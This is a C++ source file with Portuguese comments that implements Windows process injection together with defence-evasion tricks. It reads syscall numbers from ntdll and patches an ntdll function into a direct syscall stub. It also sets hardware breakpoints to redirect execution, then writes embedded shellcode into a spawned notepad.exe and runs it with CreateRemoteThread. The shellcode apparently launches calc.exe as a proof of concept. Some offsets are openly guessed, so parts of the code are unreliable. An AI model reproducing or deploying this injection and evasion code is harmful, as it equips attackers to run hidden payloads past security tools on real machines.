#include <ntstatus.h>
#include <Windows.h>
#include <winternl.h> // Para PROCESS_BASIC_INFORMATION e funções internas do Windows
#include <ntstatus.h> // Para códigos de status
#include <iostream>

typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

uint32_t ROR13Hash(const char* functionName) {
    uint32_t functionHash = 0;
    for (int i = 0; functionName[i] != '\0'; i++) {
        uint32_t c = (uint32_t)functionName[i];
        functionHash = (functionHash >> 13) | (functionHash << (32 - 13));
        functionHash += c;
    }
    return functionHash;
}

DWORD GetSSN(LPCSTR functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    uint32_t hash = ROR13Hash(functionName);
    FARPROC funcAddr = GetProcAddress(hNtdll, functionName);

    if (funcAddr == nullptr) {
        return 0;
    }

    // Exemplo de leitura do SSN. Pode ser necessário ajustar para o offset correto
    BYTE* pFunction = (BYTE*)funcAddr;
    DWORD ssn = *(DWORD*)(pFunction + 0x4); // Suposição de exemplo do offset

    return ssn;
}



bool ModifyFunctionToSyscall(DWORD ssn, FARPROC funcAddr) {
    BYTE* pFunction = reinterpret_cast<BYTE*>(funcAddr);
    DWORD oldProtect;

    if (VirtualProtect(pFunction, 10, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        pFunction[0] = 0xB8;
        *reinterpret_cast<DWORD*>(&pFunction[1]) = ssn;
        pFunction[5] = 0x0F;
        pFunction[6] = 0x05;
        pFunction[7] = 0xC3;
        VirtualProtect(pFunction, 10, oldProtect, &oldProtect);
        return true;
    }
    return false;
}

void SetHardwareBreakpoint(FARPROC funcAddr, DWORD registerIndex) {
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE hThread = GetCurrentThread();
    GetThreadContext(hThread, &ctx);

    // Definir o endereço do ponto de interrupção
    (&ctx.Dr0)[registerIndex] = (DWORD_PTR)funcAddr;

    // Configurar o ponto de interrupção para ser acionado na execução
    ctx.Dr7 |= (1 << (2 * registerIndex));

    SetThreadContext(hThread, &ctx);
}

void UpdateRAXandContinue(FARPROC funcAddr, DWORD newSSN) {
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_CONTROL;

    HANDLE hThread = GetCurrentThread();
    GetThreadContext(hThread, &ctx);

    // Atualizar RAX com o novo SSN
    ctx.Rax = newSSN;

    // Atualizar o contador de programa (RIP) para continuar após o ponto de interrupção
    ctx.Rip = (DWORD_PTR)funcAddr + 0x8; // Presumindo que o ponto de interrupção está 8 bytes à frente

    SetThreadContext(hThread, &ctx);
}

bool VerifyModification(FARPROC funcAddr, DWORD expectedSSN) {
    BYTE* pFunction = reinterpret_cast<BYTE*>(funcAddr);
    DWORD ssn = *reinterpret_cast<DWORD*>(&pFunction[1]);
    return pFunction[0] == 0xB8 && ssn == expectedSSN;
}

DWORD GetCurrentSSN(FARPROC funcAddr) {
    BYTE* pFunction = reinterpret_cast<BYTE*>(funcAddr);
    return *reinterpret_cast<DWORD*>(&pFunction[1]);
}

int main() {


    DWORD ssnNtDelayExecution = GetSSN("NtDelayExecution");
    DWORD ssnNtSetInformationThread = GetSSN("NtSetInformationThread");
    DWORD ssnNtYieldExecution = GetSSN("NtYieldExecution");
    DWORD ssnNtAllocateVirtualMemory = GetSSN("NtAllocateVirtualMemory");
    DWORD ssnNtDrawText = GetSSN("NtDrawText");



    std::cout << "SSN de NtDelayExecution: " << ssnNtDelayExecution << std::endl;
    std::cout << "SSN de NtSetInformationThread: " << ssnNtSetInformationThread << std::endl;
    std::cout << "SSN de NtYieldExecution: " << ssnNtYieldExecution << std::endl;
    std::cout << "SSN de NtAllocateVirtualMemory: " << ssnNtAllocateVirtualMemory << std::endl;
    std::cout << "SSN de NtDrawText: " << ssnNtDrawText << std::endl;

    FARPROC addrNtDelayExecution = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDelayExecution");
    FARPROC addrNtSetInformationThread = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationThread");
    FARPROC addrNtYieldExecution = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtYieldExecution");
    FARPROC addrNtAllocateVirtualMemory = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");


    std::cout << "Endereço de NtDelayExecution: " << addrNtDelayExecution << std::endl;
    std::cout << "Endereço de NtSetInformationThread: " << addrNtSetInformationThread << std::endl;
    std::cout << "Endereço de NtYieldExecution: " << addrNtYieldExecution << std::endl;
    std::cout << "Endereço de NtAllocateVirtualMemory: " << addrNtAllocateVirtualMemory << std::endl;

    DWORD ssnNtQueryInformationProcess = GetSSN("NtQueryInformationProcess");
    std::cout << "SSN de NtQueryInformationProcess: " << ssnNtQueryInformationProcess << std::endl;

    FARPROC addrNtQueryInformationProcess = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    std::cout << "Endereço de NtQueryInformationProcess: " << addrNtQueryInformationProcess << std::endl;


    FARPROC addrNtDrawText = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDrawText");
    std::cout << "Endereço de NtDrawText: " << addrNtDrawText << std::endl;

    if (addrNtDrawText != nullptr) {
        if (ModifyFunctionToSyscall(ssnNtAllocateVirtualMemory, addrNtDrawText) &&
            VerifyModification(addrNtDrawText, ssnNtAllocateVirtualMemory)) {
            std::cout << "NtDrawText foi modificada para usar SSN de NtAllocateVirtualMemory com sucesso!" << std::endl;

            // Exibir o SSN atual após a modificação
            DWORD currentSSN = GetCurrentSSN(addrNtDrawText);
            std::cout << "O novo SSN de NtDrawText é: " << currentSSN << std::endl;
        }
        else {
            std::cout << "Falha ao modificar NtDrawText para usar SSN de NtAllocateVirtualMemory" << std::endl;
        }
    }

    _NtQueryInformationProcess MyNtQueryInformationProcess =
        (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;

    typedef NTSTATUS(NTAPI* _NtCreateProcess)(
        PHANDLE ProcessHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        HANDLE ParentProcess,
        BOOLEAN InheritObjectTable,
        HANDLE SectionHandle,
        HANDLE DebugPort,
        HANDLE ExceptionPort
        );

    typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
        HANDLE ProcessHandle,
        PROCESSINFOCLASS ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
        );


    NTSTATUS status = MyNtQueryInformationProcess(
        GetCurrentProcess(),
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    if (status != STATUS_SUCCESS) {
        std::cerr << "Falha ao obter informações do processo." << std::endl;
        return 1;
    }

    // Exibindo informações do PEB
    std::cout << "Base do PEB: " << pbi.PebBaseAddress << std::endl;
    std::cout << "PID do Processo: " << pbi.UniqueProcessId << std::endl;
    // O campo InheritedFromUniqueProcessId não está disponível na estrutura oficial

    const char shellcode[] = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 };

    // Criar um processo
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(L"C:\\Windows\\System32\\notepad.exe", 
        NULL,    // Comando
        NULL,    // Atributos de segurança do processo
        NULL,    // Atributos de segurança da thread
        FALSE,   // Herança de handles
        CREATE_NEW_CONSOLE, // Flags de criação
        NULL,    // Ambiente
        NULL,    // Diretório atual
        &si,     // Informações de inicialização
        &pi))    // Informações do processo
    {
        std::cerr << "Falha na criação do processo: " << GetLastError() << std::endl;
        return 1;
    }

    typedef NTSTATUS(NTAPI* pfnNtAllocateVirtualMemory)(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
        );

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pfnNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");


    // Obter um handle do processo
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
    if (hProcess == NULL) {
        std::cerr << "Falha ao abrir o processo: " << GetLastError() << std::endl;
        return 1;
    }

    // Alocar memória no processo alvo
    PVOID remoteMemory = nullptr;
    SIZE_T shellcodeSize = sizeof(shellcode);
    NTSTATUS allocStatus = NtAllocateVirtualMemory(hProcess, &remoteMemory, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (allocStatus != STATUS_SUCCESS) {
        std::cerr << "Falha na alocação de memória: " << allocStatus << std::endl;
        CloseHandle(hProcess); // Fechar handle se falhar
        return 1;
    }

    // Escrever shellcode na memória alocada
    SIZE_T written;
    if (!WriteProcessMemory(hProcess, remoteMemory, shellcode, shellcodeSize, &written)) {
        std::cerr << "Falha ao escrever shellcode: " << GetLastError() << std::endl;
        return 1;
    }

    // Criar uma thread remota para executar o shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "Falha na criação da thread remota: " << GetLastError() << std::endl;
        CloseHandle(hProcess); // Fechar handle se falhar
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hProcess);
    CloseHandle(hThread);

    if (addrNtDrawText != nullptr) {
        if (ModifyFunctionToSyscall(ssnNtAllocateVirtualMemory, addrNtDrawText) &&
            VerifyModification(addrNtDrawText, ssnNtAllocateVirtualMemory)) {
            // Exibir o SSN atual após a modificação
            DWORD currentSSN = GetCurrentSSN(addrNtDrawText);
            std::cout << "O novo SSN de NtDrawText é: " << currentSSN << std::endl;
            std::cout << "NtDrawText foi modificada para usar SSN de NtAllocateVirtualMemory com sucesso!" << std::endl;
            SetHardwareBreakpoint(addrNtDrawText, 0); // Utilizando Dr0 para o ponto de interrupção
            typedef void (*FuncType)();
            FuncType callNtDrawText = (FuncType)addrNtDrawText;
            callNtDrawText();

            // Atualizar RAX e continuar a execução após o ponto de interrupção
            UpdateRAXandContinue(addrNtDrawText, ssnNtAllocateVirtualMemory);

        }
        else {
            std::cout << "Falha ao modificar NtDrawText." << std::endl;
        }
    }
    return 0;
}